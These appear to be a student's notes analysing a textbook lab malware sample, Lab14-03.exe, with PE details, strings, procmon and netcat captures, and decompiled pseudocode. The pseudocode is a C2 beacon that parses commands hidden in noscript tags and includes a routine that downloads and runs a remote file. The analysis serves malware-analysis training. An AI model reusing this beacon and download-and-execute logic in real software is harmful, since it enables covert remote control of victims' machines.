Lab14-03.exe
    PE Analysis
        # Virustotal
            36/69
            SHA-256: a00c3277d9e56864d615441f41d5405216c1130107067094643a268b944b9c71

            PEiD packer
                Microsoft Visual C++

            TimeStamp: 2011-08-22 05:08:27

            Subsystem: Windows GUI
            
            Sections
                Name	Virtual Address	Virtual Size	Raw Size	Entropy	MD5
                .text	4096	21974	24576	6.18	830fc2fd1c48252e32b47da9fc2fb7d7
                .rdata	28672	2434	4096	3.71	936a4ec31c810b07af05da60ee17e5cf
                .data	32768	7996	4096	1.88	37b03c1e36b7d373f483067d0ce14dc9

            IMPORT
                KERNEL32.dll
                    GetLastError
                    HeapFree
                    GetStdHandle
                    LCMapStringW
                    SetHandleCount
                    GetOEMCP
                    LCMapStringA
                    HeapDestroy
                    ExitProcess
                    GetEnvironmentStringsW
                    FlushFileBuffers
                    LoadLibraryA
                    RtlUnwind
                    GetModuleFileNameA
                    FreeEnvironmentStringsA
                    GetStartupInfoA
                    GetEnvironmentStrings
                    GetCPInfo
                    UnhandledExceptionFilter
                    MultiByteToWideChar
                    FreeEnvironmentStringsW
                    GetCommandLineA
                    GetProcAddress
                    SetStdHandle
                    SetFilePointer
                    WideCharToMultiByte
                    GetStringTypeA
                    GetModuleHandleA
                    ReadFile
                    WriteFile
                    GetCurrentProcess
                    CloseHandle
                    GetACP
                    HeapReAlloc
                    GetStringTypeW
                    TerminateProcess
                    CreateProcessA
                    HeapCreate
                    VirtualFree
                    Sleep
                    GetFileType
                    CreateFileA
                    HeapAlloc
                    GetVersion
                    VirtualAlloc
                WININET.dll
                    InternetReadFile
                    InternetOpenUrlA
                    InternetCloseHandle
                    InternetOpenA
                urlmon.dll

        # strings.exe (Only part of the results)
            *C@
            96'
            User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
            Accept: */*
            Accept-Language: en-US
            UA-CPU: x86
            Accept-Encoding: gzip, deflate
            <no
            <no
            C:\autobat.exe
            C:\autobat.exe
            http://www.practicalmalwareanalysis.com/start.htm

    Dynamic Analysis
        # RegShot (Part of results)
            Nothing valuable

        # procexp
            NULL

        # procmon
            Filter
                Process Name is Lab14-02.exe
                Operation is WriteFile Include

            Result
                9:37:05.8710221 PM	Lab14-03.exe	2584	WriteFile	C:\autobat.exe	SUCCESS	Offset: 0, Length: 49

        # autoruns
            NULL

        # ApateDNS
            www.practicalmalwareanalysis.com

        # Netcat
            $ sudo nc -lvvp 80
            Listening on [0.0.0.0] (family 0, port 80)
            Connection from [10.0.0.2] port 80 [tcp/http] accepted (family 2, sport 1174)
            GET /start.htm HTTP/1.1
            Accept: */*
            Accept-Language: en-US
            UA-CPU: x86
            Accept-Encoding: gzip, deflate
            User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)      // Two "User-Agent" strings due to InternetOpenA will contain header, too
            Host: www.practicalmalwareanalysis.com
            Cache-Control: no-cache

        # sc
            NULL

        # IDA Pro & OllyDbg
            int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
            {
            v8 = 0;
            v6 = 1;
            do
            {
                if ( v6 )
                {
                memset(&szUrl, 0, 0x200u);
                v8 = get_url(&szUrl, 512) == 0;
                }
                if ( !v8 && read_Internet_page(&szUrl, &v7) )
                v8 = command_control(&v7, &v6);
                Sleep(0x4E20u);
            }
            while ( !v8 );
            return 0;
            }

            read_Internet_page
                int __cdecl read_Internet_page(LPCSTR lpszUrl, char *a2)
                {
                v11 = word_408034;
                memset(&Buffer, 0, 0x200u);
                sprintf(&szAgent, aUserAgentMozil);           // User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .N
                sprintf(&szHeaders, aAcceptAcceptLa);         // Other Http headers
                hInternet = InternetOpenA(&szAgent, 0, 0, 0, 0);
                dwFlags = 256;
                hFile = InternetOpenUrlA(hInternet, lpszUrl, &szHeaders, 0xFFFFFFFF, 256u, 0);
                if ( hFile )
                {
                    v12 = 0;
                    do
                    {
                    if ( !InternetReadFile(hFile, &Buffer, 0x800u, &dwNumberOfBytesRead) || !dwNumberOfBytesRead )
                        break;
                    for ( i = strstr(&Buffer, aNo); i; i = strstr(i + 1, aNo_0) )                   // read between the tag <no (e.g. <no......<no)
                    {
                        if ( get_content(i, lpszUrl, a2) )
                        {
                        v12 = 1;
                        break;
                        }
                        v10 = i + 1;
                    }
                    }
                    while ( !v12 );
                    InternetCloseHandle(hInternet);
                    InternetCloseHandle(hFile);
                    result = v12;
                }
                else
                {
                    InternetCloseHandle(hInternet);
                    result = 0;
                }
                return result;
                }

                int __cdecl sub_401000(char *a1, char *a2, char *a3)
                {
                v8 = a1 + 1;
                if ( v8[8] != '>' )
                    return 0;
                if ( *v8 != 'n' )
                    return 0;
                if ( v8[5] != 'i' )
                    return 0;
                if ( v8[1] != 'o' )
                    return 0;
                if ( v8[4] != 'r' )
                    return 0;
                if ( v8[2] != 's' )
                    return 0;
                if ( v8[6] != 'p' )
                    return 0;
                if ( v8[3] != 'c' )
                    return 0;
                if ( v8[7] != 't' )
                    return 0;                                   // noscript>, and it is in <no...<no, so it should looks like <noscript>...<noscript>...
                strcpy(&v6, a2);
                v7 = strrchr(&v6, '/');                       // v7 = start.htm
                *v7 = 0;                                      // Delete string from '/' in url
                v7 = strstr(v8, &v6);                         // <noscript>...http://www.practicalmalwareanalysis****<noscript>...
                if ( !v7 )
                    return 0;
                v3 = strlen(&v6);
                v7 += v3;
                v5 = strstr(v7, a96);                         // <noscript>...http://www.practicalmalwareanalysis****96<noscript>...
                if ( !v5 )
                    return 0;
                *v5 = 0;
                strcpy(a3, v7);
                return 1;
                }

            command_control
                int __cdecl command_control(char *a1, int a2)
                {
                v6 = 0;
                strcpy(v5, "/");                              // <noscript>http://www.practicalmawalreanalysis[url]/[cmd]/[arg]96
                v2 = strtok(a1, v5);
                v4 = strtok('\0', v5);
                switch ( *v2 )
                {
                    case 'd':
                    download(v4);
                    break;
                    case 'n':
                    v6 = 1;
                    break;
                    case 'r':
                    update(v4);
                    *a2 = 1;
                    break;
                    case 's':
                    sleep(v4);
                    break;
                    default:
                    return v6;
                }
                return v6;
                }

                    int __cdecl update(char *a1)            // update url in autobat.exe
                    {
                    result = encoding(v2, a1);              // index: /dcbahgfelkjiponmqrstuvwxyz0123456789:.
                    if ( result )
                        result = write_url_into_autobat_exe(v2);
                    return result;
                    }

                    char __cdecl download(char *a1)
                    {
                    if ( encoding(&v5, a1) )                                                        // decode
                    {
                        v3 = URLDownloadToCacheFileA(0, &v5, &ApplicationName, 0x200u, 0, 0);       // main()
                        if ( v3 )
                        return 0;
                        memset(&StartupInfo, 0, 0x44u);
                        StartupInfo.cb = 68;
                        memset(&ProcessInformation, 0, 0x10u);
                        CreateProcessA(&ApplicationName, 0, 0, 0, 0, 0, 0, 0, &StartupInfo, &ProcessInformation);
                    }
                    return 0;
                    }

autobat.exe
    $ file autobat.exe
    autobat.exe: ASCII text, with no line terminators

    $ cat autobat.exe
    http://www.practicalmalwareanalysis.com/start.htm


Analysis
    This malware will firstly create an autobat.exe and write the initial url string http://www.practicalmalwareanalysis.com/start.htm into it. And then open the url and read content in a rule to get a new url to update commands.